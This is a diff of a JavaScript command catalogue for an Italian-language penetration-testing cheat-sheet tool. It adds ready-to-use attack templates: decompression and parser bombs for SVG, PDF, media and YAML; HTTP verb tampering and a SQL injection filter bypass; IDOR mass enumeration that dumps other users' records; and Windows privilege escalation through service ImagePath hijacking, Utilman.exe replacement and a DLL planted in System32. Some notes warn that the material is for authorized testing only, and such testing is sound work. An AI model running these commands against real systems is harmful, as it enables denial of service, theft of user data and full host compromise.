+        "template": "<?xml version=\"1.0\"?>\n<svg xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\" width=\"100\" height=\"100\">\n  <defs id=\"d\">\n    <rect id=\"a\" width=\"100\" height=\"100\"/>\n    <g id=\"b\"><use xlink:href=\"#a\"/><use xlink:href=\"#a\"/><use xlink:href=\"#a\"/><use xlink:href=\"#a\"/><use xlink:href=\"#a\"/><use xlink:href=\"#a\"/><use xlink:href=\"#a\"/><use xlink:href=\"#a\"/><use xlink:href=\"#a\"/><use xlink:href=\"#a\"/></g>\n    <g id=\"c\"><use xlink:href=\"#b\"/><use xlink:href=\"#b\"/><use xlink:href=\"#b\"/><use xlink:href=\"#b\"/><use xlink:href=\"#b\"/><use xlink:href=\"#b\"/><use xlink:href=\"#b\"/><use xlink:href=\"#b\"/><use xlink:href=\"#b\"/><use xlink:href=\"#b\"/></g>\n    <g id=\"e\"><use xlink:href=\"#c\"/><use xlink:href=\"#c\"/><use xlink:href=\"#c\"/><use xlink:href=\"#c\"/><use xlink:href=\"#c\"/><use xlink:href=\"#c\"/><use xlink:href=\"#c\"/><use xlink:href=\"#c\"/><use xlink:href=\"#c\"/><use xlink:href=\"#c\"/></g>\n  </defs>\n  <use xlink:href=\"#e\"/>\n</svg>",
+        "description": "SVG che esplode al rendering, non via entità XML — quindi passa anche dove l’XXE è bloccato. I `<use>` annidati si moltiplicano e mandano in crisi il rasterizzatore (librsvg, ImageMagick, headless Chrome) su avatar, anteprime e conversioni. Parti da pochi livelli e aggiungine misurando CPU/RAM."
+      },
+      {
+        "id": "pdf",
+        "label": "PDF",
+        "template": "convert -size 20000x20000 xc:white bomb.pdf",
+        "description": "Un PDF che al render esplode: il rasterizzatore (Ghostscript, poppler, pdfium) va in hang o OOM mentre genera l’anteprima o estrae il testo. Qui una pagina enorme da rasterizzare; le varianti più raffinate usano oggetti/stream annidati o migliaia di pagine. Target: convertitori PDF→immagine, estrattori di testo, antivirus."
+      },
+      {
+        "id": "media",
+        "label": "Media",
+        "template": "ffmpeg -f lavfi -i color=c=white:s=16000x16000:d=1 -frames:v 1 mediabomb.mkv",
+        "description": "File media con risoluzione o durata dichiarate assurde: il transcoder (`ffmpeg`, pipeline di anteprima) alloca per-frame o decodifica a lungo, saturando CPU e RAM. È il vettore più costoso da calibrare: alza `s=` misurando, oppure punta a una durata enorme con un file reale minuscolo."
+      },
+      {
+        "id": "parser",
+        "label": "Parser",
+        "template": "# YAML anchor-bomb: alias ricorsivi, esplodono in RAM al parse (dove l’app importa YAML)\na: &a [\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\",\"x\"]\nb: &b [*a,*a,*a,*a,*a,*a,*a,*a,*a]\nc: &c [*b,*b,*b,*b,*b,*b,*b,*b,*b]\nd: &d [*c,*c,*c,*c,*c,*c,*c,*c,*c]\ne: &e [*d,*d,*d,*d,*d,*d,*d,*d,*d]\n# aggiungi f, g, h solo misurando: ogni livello moltiplica ×9",
+        "description": "Se l’app importa file di config o dati, il parser stesso è il bersaglio:\n<ul><li><strong>YAML</strong> — anchor/alias ricorsivi (il billion-laughs dello YAML), come nel payload: esplode in RAM se il loader espande gli alias.</li><li><strong>JSON</strong> — annidamento profondo manda in stack-overflow i parser ricorsivi: <code>python3 -c \"print('['*100000)\"</code>.</li><li><strong>CSV/XLSX</strong> — righe o colonne sterminate, o range/formula giganti ricalcolati lato server.</li></ul>"
+      }
+    ],
+    "note": "# Come scegliere\n- il server spacchetta archivi o parsa OOXML → Zip bomb\n- ridimensiona o fa il thumbnail delle immagini → Pixel flood (o SVG se accetta SVG)\n- genera anteprime PDF o estrae testo → PDF bomb\n- transcodifica audio/video → Media bomb\n- importa config o dati (YAML, JSON, CSV, XLSX) → Parser bomb\n# Dimostrarlo SENZA downtime\n- parti dal payload minimo e misura tempo di risposta, CPU e RAM sul target\n- la sola crescita non-lineare prova il difetto: non serve saturare\n- fermati appena noti degradazione, non lanciare la versione full\n# Difese che negano il bug\nRatio/size cap sulla decompressione, `MAX_IMAGE_PIXELS` (Pillow), limiti di risoluzione del decoder, timeout di transcodifica, loader YAML in modalità safe senza alias ricorsivi: se sono attivi, il servizio regge.\n# Attenzione\nQuesti sono DoS reali: possono rendere il servizio indisponibile. Usali SOLO con autorizzazione esplicita, come test di disponibilità concordato, preferibilmente su staging o in finestra, col payload minimo che dimostra il difetto.",
+    "refs": [
+      {
+        "label": "OWASP — Denial of Service",
+        "url": "https://owasp.org/www-community/attacks/Denial_of_Service"
+      },
+      {
+        "label": "CWE-409 — Decompression Bomb",
+        "url": "https://cwe.mitre.org/data/definitions/409.html"
+      },
+      {
+        "label": "bamsoftware — A better zip bomb",
+        "url": "https://www.bamsoftware.com/hacks/zipbomb/"
+      }
+    ]
   },
   {
     "id": "ssrf",
@@ -9951,8 +10533,8 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "web-app-testing",
     "group": "Access Control",
-    "description": "Se GET su un’area protetta è bloccato, prova altri metodi: a volte l’autenticazione copre solo GET/POST e PUT/PATCH passano.",
-    "note": "# Cosa osservare\nL’autenticazione copre spesso solo GET/POST: prova HEAD, PUT, PATCH, DELETE o un metodo inventato. Se un verbo diverso risponde 200 o esegue l’azione, il controllo è legato al metodo e lo aggiri. Verifica anche l’header X-HTTP-Method-Override.",
+    "description": "Se un metodo su un’area protetta è bloccato, prova altri verbi: spesso l’autenticazione o i filtri coprono solo GET/POST mentre PUT/PATCH/HEAD passano. Vale sia per l’auth sia per i filtri anti-SQLi/XSS.",
+    "note": "# Due cause\n- Configurazione insicura: l’ACL del web server limita solo certi verbi (`<Limit GET POST>` in Apache/.htaccess, `<authorization>` su un verbo in IIS web.config). Un metodo non elencato salta l’autenticazione.\n- Codice insicuro: il controllo è nel codice (`if method == 'POST'`) ma l’azione viene eseguita comunque con un altro verbo.\n# Cosa provare\nHEAD, PUT, PATCH, DELETE, OPTIONS o un metodo inventato (`FOO`). Se un verbo diverso risponde 200 o esegue l’azione, il controllo è legato al metodo. Verifica anche l’header `X-HTTP-Method-Override`.\n# Oltre l’auth\nLo stesso trucco aggira i filtri di sicurezza: se la sanificazione anti-SQLi/XSS è legata a POST, rimanda gli stessi parametri in GET.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -9987,10 +10569,28 @@ const COMMANDS = [
         "description": "Altro verbo da provare."
       },
       {
+        "id": "head",
+        "label": "HEAD",
+        "template": "curl -I http://<ip>/admin/",
+        "description": "HEAD eredita la logica di GET ma senza body: alcuni server eseguono comunque l’azione saltando il controllo."
+      },
+      {
         "id": "options",
         "label": "OPTIONS",
         "template": "curl -i -X OPTIONS http://<ip>/admin/",
         "description": "Mostra i metodi permessi nell’header Allow."
+      },
+      {
+        "id": "override",
+        "label": "Method override",
+        "template": "curl -X POST http://<ip>/admin/delete -H 'X-HTTP-Method-Override: DELETE'",
+        "description": "Se il framework rispetta l’override, aggiri un filtro legato al verbo restando su POST."
+      },
+      {
+        "id": "filter-bypass",
+        "label": "Bypass filtro",
+        "template": "curl -s 'http://<ip>/search?q=1%27+OR+1=1--'",
+        "description": "Se la sanificazione è solo su POST, rimanda gli stessi parametri in GET (o un verbo arbitrario) per aggirarla."
       }
     ]
   },
@@ -10000,8 +10600,8 @@ const COMMANDS = [
     "category": "vuln-analysis",
     "subcategory": "web-app-testing",
     "group": "Access Control",
-    "description": "Modifica un identificatore nella request per accedere a risorse di altri utenti. Gli ID sequenziali si cercano in URL, parametri e body.",
-    "note": "# Prossimo passo\nCambia l’identificatore (URL, parametro, body, cookie) per leggere risorse altrui. Gli ID sequenziali si fuzzano con Burp Intruder; UUID o hash apparentemente casuali vanno pescati altrove (risposte precedenti, endpoint di listing). Prova anche a cambiare metodo e Content-Type.",
+    "description": "Modifica un identificatore nella request per accedere a risorse di altri utenti. Gli ID stanno in URL, parametri, body, cookie e header; non solo numerici sequenziali ma anche UUID, hash e reference codificate.",
+    "note": "# Dove cercare l’identificatore\n- URL e path: `/api/user/1`, `/invoice?id=1`\n- body, cookie, header custom (`X-User-Id`), campi nascosti\n- reference non ovvie: UUID, hash, base64 — pescale dalle risposte di listing o dal JS\n# Tecniche\n- sequenziali: Burp Intruder o `ffuf` su un range numerico\n- codificate: replica la codifica (md5/base64) degli altri ID\n- API: cambia metodo (GET→PUT/POST/DELETE) e aggiungi parametri come `uid`/`role`\n# Chaining\nUn IDOR in sola lettura spesso rivela i parametri (token, id interni) per un secondo IDOR in scrittura o per una privesc: concatenali.\n# Attenzione\nLeggere o modificare dati di utenti reali ha impatto: enumera con criterio e solo nel perimetro autorizzato.",
     "platform": "cross-platform",
     "requires": [
       "no-creds"
@@ -10013,8 +10613,61 @@ const COMMANDS = [
       "idor",
       "access-control"
     ],
-    "template": "GET /api/user/2   (originale: /api/user/1)",
-    "params": []
+    "template": "# baseline: la tua risorsa\ncurl -s http://<ip>/api/user/1 -H 'Authorization: Bearer <token>'\n\n# IDOR: stesso endpoint, id di un altro utente\ncurl -s http://<ip>/api/user/2 -H 'Authorization: Bearer <token>'",
+    "params": [
+      {
+        "key": "ip",
+        "label": "Target",
+        "ctx": "ip",
+        "placeholder": "10.10.10.11"
+      },
+      {
+        "key": "token",
+        "label": "Token/Cookie",
+        "placeholder": "eyJ..."
+      },
+      {
+        "key": "wordlist",
+        "label": "Wordlist/range",
+        "placeholder": "ids.txt"
+      }
+    ],
+    "variants": [
+      {
+        "id": "default",
+        "label": "Manuale",
+        "template": "# baseline: la tua risorsa\ncurl -s http://<ip>/api/user/1 -H 'Authorization: Bearer <token>'\n\n# IDOR: stesso endpoint, id di un altro utente\ncurl -s http://<ip>/api/user/2 -H 'Authorization: Bearer <token>'",
+        "description": "Cambia l’identificatore e confronta la risposta con la baseline."
+      },
+      {
+        "id": "mass",
+        "label": "Mass enumeration",
+        "template": "# enumera gli id sequenziali e salva ogni risposta\nffuf -w <wordlist> -u 'http://<ip>/api/user/FUZZ' \\\n  -H 'Authorization: Bearer <token>' -mc 200 -od loot/",
+        "description": "Scarica in blocco le risorse altrui. `<wordlist>` = una lista di ID (`seq 0 1000 > ids.txt`) o una SecList. In Burp usa Intruder con payload numerico."
+      },
+      {
+        "id": "encoded",
+        "label": "Reference codificata",
+        "template": "# l'id e' un hash o base64? replica la codifica degli altri valori\necho -n 2 | md5sum\necho -n '{\"id\":2}' | base64",
+        "description": "Se il reference è `?doc=<md5>` o base64, calcola quello degli altri ID. Guarda il JS lato client: spesso genera il reference e rivela l’algoritmo."
+      },
+      {
+        "id": "api-method",
+        "label": "IDOR in API",
+        "template": "# l'ACL copre GET ma non PUT/POST: cambia metodo e/o uid nel body\ncurl -s -X PUT http://<ip>/api/user/2 \\\n  -H 'Content-Type: application/json' \\\n  -H 'Authorization: Bearer <token>' \\\n  --data '{\"role\":\"admin\"}'",
+        "description": "Nelle API l’IDOR si combina con il verb tampering e con parametri nascosti (`uid`, `role`) nel body. Prova anche a cambiare `Content-Type` e ad aggiungere l’id come secondo parametro."
+      }
+    ],
+    "refs": [
+      {
+        "label": "PortSwigger — IDOR",
+        "url": "https://portswigger.net/web-security/access-control/idor"
+      },
+      {
+        "label": "HackTricks — IDOR",
+        "url": "https://book.hacktricks.wiki/en/pentesting-web/idor.html"
+      }
+    ]
   },
   {
     "id": "jwt-attacks",
@@ -12131,7 +12784,7 @@ const COMMANDS = [
     "name": "LinPEAS — enum privesc",
     "category": "privesc-linux",
     "subcategory": "auto-enum",
-    "group": "Linux",
+    "group": "Scanner",
     "description": "Lo scan privesc più completo su Linux: evidenzia in rosso/giallo i vettori interessanti (SUID, cron, capabilities, password).",
     "note": "# Cosa osservare\nI risultati in rosso/giallo sono i vettori più probabili (SUID insoliti, sudo, cron scrivibili, credenziali). LinPEAS segnala, non sfrutta: conferma sempre a mano prima di procedere.",
     "platform": "linux",
@@ -12172,7 +12825,7 @@ const COMMANDS = [
     "name": "linux-exploit-suggester",
     "category": "privesc-linux",
     "subcategory": "auto-enum",
-    "group": "Linux",
+    "group": "Exploit suggester",
     "description": "Confronta la versione del kernel e dei pacchetti installati con un database di exploit noti, producendo una lista ordinata per probabilità di successo. I risultati vanno sempre incrociati con l'output di LinPEAS e verificati, perché molti sono falsi positivi legati a backport di sicurezza che correggono la falla senza cambiare il numero di versione.",
     "note": "# Attenzione\nSi basa sulla versione del kernel e dà molti falsi positivi. Un kernel exploit sbagliato manda la macchina in panic: è l’ultima risorsa, dopo aver escluso sudo, SUID, cron e capabilities.",
     "platform": "linux",
@@ -12193,7 +12846,7 @@ const COMMANDS = [
     "name": "sudo -l — privilegi sudo",
     "category": "privesc-linux",
     "subcategory": "sudo",
-    "group": "Linux",
+    "group": "Enum (sudo -l)",
     "description": "Mostra quali comandi l'utente corrente può eseguire via `sudo`. Per ogni binario marcato `NOPASSWD` l'escape corrispondente si cerca su GTFOBins.",
     "note": "# Prossimo passo\nPer ogni voce NOPASSWD cerca il binario su GTFOBins. Se compare env_keep+=LD_PRELOAD o LD_LIBRARY_PATH usa la variante LD_PRELOAD; (ALL) senza restrizioni significa root diretto con sudo su.",
     "platform": "linux",
@@ -12219,7 +12872,7 @@ const COMMANDS = [
     "name": "sudo — abuso LD_PRELOAD",
     "category": "privesc-linux",
     "subcategory": "sudo",
-    "group": "Linux",
+    "group": "LD_PRELOAD",
     "description": "Se `sudo -l` mostra `env_keep+=LD_PRELOAD`, carica una libreria che dà shell root. Compila `evil.c` con `void _init(){setuid(0);system(\"/bin/bash\");}` (`gcc -fPIC -shared -o evil.so evil.c -nostartfiles`).",
     "note": "# Prerequisiti\nFunziona solo se sudo -l mostra env_keep+=LD_PRELOAD. Compili una libreria con la funzione _init() che lancia la shell e la carichi via sudo su un binario permesso.",
     "platform": "linux",
@@ -12245,7 +12898,7 @@ const COMMANDS = [
     "name": "sudo CVE-2019-14287",
     "category": "privesc-linux",
     "subcategory": "sudo",
-    "group": "Linux",
+    "group": "CVE sudo",
     "description": "Su `sudo < 1.8.28` con una regola tipo `(ALL,!root)`, l’UID `-1` viene risolto come `0`, shell root.",
     "note": "# Prerequisiti\nColpisce sudo precedente alla 1.8.28 con una regola tipo (ALL, !root): sudo -u#-1 bypassa il blocco su root. Controlla la versione con sudo --version.",
     "platform": "linux",
@@ -12265,7 +12918,7 @@ const COMMANDS = [
     "name": "SUID/SGID — trova e abusa",
     "category": "privesc-linux",
     "subcategory": "suid-sgid",
-    "group": "Linux",
+    "group": "SUID / SGID",
     "description": "Trova i binari `SUID` (eseguono come owner, spesso root). Per ognuno controlla GTFOBins; se è custom analizzalo per command injection o path hijack.",
     "note": "# Prossimo passo\nConfronta i binari trovati con GTFOBins. I binari custom o non standard vanno analizzati a parte (strings, ltrace): spesso invocano altri eseguibili senza path assoluto, sfruttabili via PATH hijack.",
     "platform": "linux",
@@ -12328,7 +12981,7 @@ const COMMANDS = [
     "name": "getcap — capabilities",
     "category": "privesc-linux",
     "subcategory": "capabilities",
-    "group": "Linux",
+    "group": "Capabilities",
     "description": "Elenca i file con capabilities e i poteri speciali che ne derivano. Da controllare in particolare:\n- `cap_setuid` = consente di impostare UID 0 e diventare root\n- `cap_dac_read_search` = consente la lettura di qualsiasi file bypassando i permessi, per esempio `/etc/shadow`\n- `cap_net_bind_service` = consente il bind su porte inferiori a 1024",
     "note": "# Cosa osservare\nLe capabilities più sfruttabili: cap_setuid (shell root diretta), cap_dac_read_search (leggi qualsiasi file, es. shadow), cap_sys_admin. Il suffisso =ep indica capability piena sul binario.",
     "platform": "linux",
@@ -12348,7 +13001,7 @@ const COMMANDS = [
     "name": "cap_setuid, shell root",
     "category": "privesc-linux",
     "subcategory": "capabilities",
-    "group": "Linux",
+    "group": "Capabilities",
     "description": "Un binario con `cap_setuid+ep`, per esempio `python3`, permette di impostare UID 0 e aprire una shell di root.",
     "note": "# Prerequisiti\nServe un interprete (python, perl) con cap_setuid+ep. Con os.setuid(0) e poi la shell diventi root senza bisogno di un binario SUID classico.",
     "platform": "linux",
@@ -12368,7 +13021,7 @@ const COMMANDS = [
     "name": "Cron — scopri e abusa",
     "category": "privesc-linux",
     "subcategory": "cron-tasks",
-    "group": "Linux",
+    "group": "Cron jobs",
     "description": "Elenca cron job e timer. Un job che gira come root ed esegue uno script scrivibile, o che usa una wildcard, apre all'iniezione di comandi.",
     "note": "# Prossimo passo\nCerca cron job che eseguono script scrivibili da te, o che usano wildcard (es. tar *) o PATH relativo. pspy mostra i job in esecuzione senza dover leggere i file di cron.",
     "platform": "linux",
@@ -12419,7 +13072,7 @@ const COMMANDS = [
     "name": "Kernel exploit — Linux",
     "category": "privesc-linux",
     "subcategory": "kernel",
-    "group": "Linux",
+    "group": "Kernel exploit",
     "description": "Ultima risorsa (può far crashare l'host). CVE comuni:\n- PwnKit (`CVE-2021-4034`) = polkit, quasi universale\n- DirtyPipe (`CVE-2022-0847`) = kernel 5.8-5.16.11\n- DirtyCow (`CVE-2016-5195`) = kernel vecchi",
     "note": "# Attenzione\nUltima risorsa: un exploit kernel sbagliato causa un kernel panic. Identifica versione (uname -r) e CVE note (DirtyPipe, DirtyCow, PwnKit). PwnKit (pkexec) e Baron Samedit sono più affidabili del kernel puro.",
     "platform": "linux",
@@ -12446,7 +13099,7 @@ const COMMANDS = [
     "name": "Gruppo docker / lxd, root",
     "category": "privesc-linux",
     "subcategory": "container-escape",
-    "group": "Linux",
+    "group": "Docker / LXD",
     "description": "L'appartenenza al gruppo `docker` o `lxd` consente di montare il filesystem dell'host dentro un container privilegiato e di ottenere root.",
     "note": "# Prerequisiti\nAppartenere al gruppo docker o lxd equivale a root: monti il filesystem dell’host dentro un container privilegiato e ne esci con accesso completo. Verifica con id.",
     "platform": "linux",
@@ -12481,7 +13134,7 @@ const COMMANDS = [
     "name": "NFS no_root_squash, root",
     "category": "privesc-linux",
     "subcategory": "container-escape",
-    "group": "Host Escape",
+    "group": "NFS no_root_squash",
     "description": "Se un export in `/etc/exports` ha `no_root_squash`, monta la share da attacker (come root), crea una bash `SUID`, poi eseguila sul target.",
     "note": "# Prerequisiti\nFunziona se un export NFS ha no_root_squash (vedi showmount -e o /etc/exports). Da root sulla tua macchina monti la share e ci lasci un binario SUID root: sul target quel binario gira come root.",
     "platform": "linux",
@@ -12530,7 +13183,7 @@ const COMMANDS = [
     "name": "WinPEAS — enum privesc",
     "category": "privesc-windows",
     "subcategory": "auto-enum",
-    "group": "Windows",
+    "group": "Scanner",
     "description": "Enumerazione automatica per Windows, equivalente di LinPEAS: setaccia servizi, permessi deboli, credenziali salvate, privilegi del token e AlwaysInstallElevated, evidenziando in rosso i vettori più promettenti. Su un target con EDR attivo il binario viene spesso segnalato, e conviene ripiegare su Seatbelt o sui comandi manuali.",
     "note": "# Cosa osservare\nEvidenzia in rosso i vettori probabili: privilegi del token, servizi mal configurati, credenziali salvate, AlwaysInstallElevated. Esegui la build giusta (x64/x86) e conferma a mano.",
     "platform": "windows",
@@ -12551,7 +13204,7 @@ const COMMANDS = [
     "name": "Seatbelt — security checks",
     "category": "privesc-windows",
     "subcategory": "auto-enum",
-    "group": "Windows",
+    "group": "Scanner",
     "description": "Raccoglie decine di controlli di sicurezza sull'host Windows in un'unica passata: privilegi del token, stato UAC, configurazione dei servizi, credenziali salvate, cronologia dei browser e altro. Rispetto a WinPEAS l'output è organizzato per categoria, più leggibile quando serve solo un'area. `-group=all` esegue ogni check disponibile.",
     "note": "# Cosa osservare\nRaccoglie decine di check di sicurezza (UAC, LAPS, credenziali salvate, sessioni, AutoLogon). Dà il quadro completo: incrocialo con WinPEAS per i vettori davvero sfruttabili.",
     "platform": "windows",
@@ -12571,7 +13224,7 @@ const COMMANDS = [
     "name": "PowerUp / SharpUp — misconfig",
     "category": "privesc-windows",
     "subcategory": "auto-enum",
-    "group": "Windows",
+    "group": "Scanner",
     "description": "Cerca le misconfigurazioni di Windows che portano a escalation locale: servizi con permessi deboli, binari modificabili, unquoted service path e AlwaysInstallElevated. Per ogni problema trovato indica già la funzione di abuso da richiamare. Gira in memoria via PowerShell, il che riduce le tracce su disco ma resta rilevabile dai controlli su AMSI.",
     "note": "# Prossimo passo\nInvoke-AllChecks elenca servizi modificabili, unquoted path e registry deboli, e include le funzioni per abusarli. SharpUp è la versione C# per ambienti senza PowerShell.",
     "platform": "windows",
@@ -12606,7 +13259,7 @@ const COMMANDS = [
     "name": "Windows Exploit Suggester",
     "category": "privesc-windows",
     "subcategory": "auto-enum",
-    "group": "Windows",
+    "group": "Exploit suggester",
     "description": "Windows Exploit Suggester confronta l'output di `systeminfo`, quindi versione, build e hotfix installati, con il database dei bollettini Microsoft per elencare le vulnerabilità kernel non corrette. Gira in locale sull'output salvato, senza toccare il target. La lista va filtrata tenendo solo gli exploit con codice pubblico affidabile, perché molti risultati sono soltanto teorici.",
     "note": "# Prerequisiti\nUsa l’output di systeminfo (fase Post-Exploitation): confronta le hotfix installate col DB MSRC e segnala gli exploit kernel mancanti. Preferiscilo al kernel exploit cieco.",
     "platform": "windows",
@@ -12627,9 +13280,9 @@ const COMMANDS = [
     "name": "whoami /priv",
     "category": "privesc-windows",
     "subcategory": "token-priv",
-    "group": "Windows",
-    "description": "Mostra i privilegi del token. I più sfruttabili:\n<ul><li><code>SeImpersonatePrivilege</code></li><li><code>SeBackupPrivilege</code></li><li><code>SeTakeOwnershipPrivilege</code></li><li><code>SeLoadDriverPrivilege</code></li></ul>",
-    "note": "# Cosa osservare\nSeImpersonate e SeAssignPrimaryToken abilitano i Potato verso SYSTEM; SeBackup/SeRestore leggono SAM e NTDS; SeDebug la memoria di LSASS; SeLoadDriver carica driver vulnerabili.",
+    "group": "Enum",
+    "description": "Mostra i privilegi del token. I più sfruttabili:\n<ul><li><code>SeImpersonatePrivilege</code> / <code>SeAssignPrimaryTokenPrivilege</code></li><li><code>SeBackupPrivilege</code> / <code>SeRestorePrivilege</code></li><li><code>SeTakeOwnershipPrivilege</code></li><li><code>SeDebugPrivilege</code></li><li><code>SeLoadDriverPrivilege</code></li><li><code>SeManageVolumePrivilege</code></li><li><code>SeCreateTokenPrivilege</code> / <code>SeTcbPrivilege</code></li></ul>",
+    "note": "# Cosa osservare\nSeImpersonate e SeAssignPrimaryToken abilitano i Potato verso SYSTEM; SeBackup/SeRestore leggono o sovrascrivono file protetti (SAM, NTDS); SeDebug apre la memoria di LSASS; SeLoadDriver carica driver vulnerabili; SeManageVolume dà scrittura su System32; SeCreateToken/SeTcb forgiano un token privilegiato.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -12647,9 +13300,9 @@ const COMMANDS = [
     "name": "SeImpersonate, SYSTEM (Potato)",
     "category": "privesc-windows",
     "subcategory": "token-priv",
-    "group": "Windows",
+    "group": "SeImpersonate (Potato)",
     "description": "`SeImpersonatePrivilege`, tipico di service account, IIS e MSSQL, consente di abusare di un named pipe per ottenere SYSTEM. Il tool si sceglie in base alla versione di Windows.",
-    "note": "# Prerequisiti\nServe SeImpersonatePrivilege (tipico di account di servizio, IIS, MSSQL). PrintSpoofer sfrutta lo spooler; se è patchato usa GodPotato o JuicyPotatoNG. Risultato: shell SYSTEM.",
+    "note": "# Prerequisiti\nServe SeImpersonatePrivilege (tipico di account di servizio, IIS, MSSQL); `SeAssignPrimaryTokenPrivilege` compare spesso insieme e porta allo stesso risultato. PrintSpoofer sfrutta lo spooler; se è patchato usa GodPotato o JuicyPotatoNG. Risultato: shell SYSTEM.",
     "platform": "windows",
     "requires": [
       "shell"
@@ -12688,7 +13341,7 @@ const COMMANDS = [
     "name": "SeBackup / SeTakeOwnership",
     "category": "privesc-windows",
     "subcategory": "token-priv",
-    "group": "Windows",
+    "group": "SeBackup / SeRestore",
     "description": "`SeBackupPrivilege` consente la copia di file protetti come SAM, SYSTEM e NTDS, mentre `SeTakeOwnershipPrivilege` consente di prendere possesso di un file e di assegnarsi i permessi.",
     "note": "# Prossimo passo\nCon SeBackupPrivilege copi gli hive SAM e SYSTEM, o il file NTDS.dit su un DC, e li dai a secretsdump offline per gli hash. Non ti rende SYSTEM ma ti consegna le credenziali.",
     "platform": "windows",
@@ -12725,11 +13378,51 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "serestore",
+    "name": "SeRestore — scrittura protetta → SYSTEM",
+    "category": "privesc-windows",
+    "subcategory": "token-priv",
+    "group": "SeBackup / SeRestore",
+    "description": "`SeRestorePrivilege` concede scrittura su qualunque file e chiave di registro ignorando le ACL. Vie tipiche: sovrascrivere il binario di un servizio che gira come SYSTEM, impostarne l’`ImagePath` nel registro, oppure rimpiazzare un LOLBin di accessibilità come `Utilman.exe`. Spesso è concesso insieme a `SeBackupPrivilege`.",
+    "note": "# Prerequisiti\nIl privilegio va abilitato nel token (molti PoC lo fanno via `AdjustTokenPrivileges`; di default è Disabled). Tipico degli account di backup, che di solito hanno anche SeBackup.\n# Risultato\nEsecuzione come SYSTEM al riavvio del servizio, o shell SYSTEM dalla schermata di blocco (Utilman + Win+U) su sessioni console/RDP.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "serestore",
+      "token"
+    ],
+    "template": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\\Temp\\rev.exe /f\nsc start <svc>",
+    "params": [
+      {
+        "key": "svc",
+        "label": "Servizio",
+        "placeholder": "vulnsvc"
+      }
+    ],
+    "variants": [
+      {
+        "id": "imagepath",
+        "label": "Service ImagePath",
+        "template": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\<svc> /v ImagePath /t REG_EXPAND_SZ /d C:\\Temp\\rev.exe /f\nsc start <svc>",
+        "description": "Ripunta un servizio al tuo binario e lo avvii. Serve SeRestore attivo nel token."
+      },
+      {
+        "id": "utilman",
+        "label": "Utilman (lockscreen)",
+        "template": "copy /Y C:\\Temp\\cmd.exe C:\\Windows\\System32\\Utilman.exe",
+        "description": "Sostituisci Utilman.exe; alla schermata di blocco premi Win+U per una shell SYSTEM. Solo con accesso console/RDP."
+      }
+    ]
+  },
+  {
     "id": "sedebug",
     "name": "SeDebug — LSASS dump / RCE SYSTEM",
     "category": "privesc-windows",
     "subcategory": "token-priv",
-    "group": "Windows",
+    "group": "SeDebug",
     "description": "`SeDebugPrivilege` apre la memoria di qualunque processo. Due usi distinti: dumpare LSASS per estrarne le credenziali, oppure creare un processo figlio che eredita il token di un processo SYSTEM (es. winlogon), ottenendo SYSTEM diretto. Tipico di account di servizio e di sessioni di debug.",
     "note": "# Primary token, non impersonation\nSeDebug si attiva solo da un primary token. Se `whoami /priv` lo mostra `Disabled` e psgetsys fallisce, sei in un impersonation token (tipico delle shell via Invoke-Command): il privilegio compare ma non si abilita. Diagnosi: `[System.Diagnostics.Process]::EnterDebugMode()` → se solleva eccezione serve una sessione reale. Rientra con Evil-WinRM o RunasCs (creano un primary token via LogonUser), non con Invoke-Command.\n# Dump LSASS\nIl `.dmp` si porta offline e si parsa con pypykatz/mimikatz `sekurlsa::minidump` (vedi Post-Exploitation → mimikatz). La variante fileless usa il LOLBin `comsvcs.dll`.\n# Prossimo passo\nLa via token dà SYSTEM subito; la via LSASS dà hash/password da riusare su altri servizi.",
     "platform": "windows",
@@ -12783,11 +13476,94 @@ const COMMANDS = [
     ]
   },
   {
+    "id": "semanagevolume",
+    "name": "SeManageVolume — DLL in System32 → SYSTEM",
+    "category": "privesc-windows",
+    "subcategory": "token-priv",
+    "group": "SeManageVolume",
+    "description": "`SeManageVolumePrivilege` si traduce in accesso in scrittura completo al volume, incluse cartelle protette. Lo si sfrutta ottenendo il Full Control su `C:\\Windows\\System32` e piazzandovi una DLL che un processo privilegiato carica (DLL hijacking), per esecuzione come SYSTEM.",
+    "note": "# Meccanismo\nIl PoC pubblico `SeManageVolumeExploit` usa la primitiva per concedere al gruppo Users il Full Control su System32. Da lì il vettore è un DLL hijack: una DLL mancante caricata da un processo SYSTEM.\n# Bersagli DLL comuni\n- `WptsExtensions.dll` (Task Scheduler, al boot)\n- `tzres.dll` via `systeminfo`",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "semanagevolume",
+      "dll-hijack",
+      "token"
+    ],
+    "template": ".\\SeManageVolumeExploit.exe",
+    "params": [],
+    "variants": [
+      {
+        "id": "grant",
+        "label": "Grant su System32",
+        "template": ".\\SeManageVolumeExploit.exe",
+        "description": "Concede Full Control su C:\\Windows\\System32 all’utente corrente."
+      },
+      {
+        "id": "dll",
+        "label": "Piazza la DLL",
+        "template": "copy payload.dll C:\\Windows\\System32\\WptsExtensions.dll",
+        "description": "Droppi la DLL di hijack e attendi il trigger (reboot / Task Scheduler)."
+      }
+    ]
+  },
+  {
+    "id": "setcb-createtoken",
+    "name": "SeCreateToken / SeTcb — forgia un token",
+    "category": "privesc-windows",
+    "subcategory": "token-priv",
+    "group": "SeTcb / SeCreateToken",
+    "description": "`SeCreateTokenPrivilege` permette di costruire da zero un token di accesso con l’SID di SYSTEM e i gruppi di amministrazione e poi impersonarlo. `SeTcbPrivilege` (act as part of the OS), combinato con `LsaLogonUser`, consente di farsi rilasciare un token con gruppi/privilegi arbitrari. Entrambi sono rari e si sfruttano con un PoC dedicato.",
+    "note": "# Approccio\nServe un binario che chiami `NtCreateToken`/`LsaLogonUser` con il privilegio attivo (Tokenvator copre parte di questi casi). Non c’è un one-liner universale: usa il PoC adatto alla build.\n# Risultato\nToken SYSTEM impersonato nel processo corrente.",
+    "platform": "windows",
+    "requires": [
+      "shell"
+    ],
+    "protocols": [],
+    "tags": [
+      "secreatetoken",
+      "setcb",
+      "token"
+    ],
+    "template": ".\\Tokenvator.exe",
+    "params": []
+  },
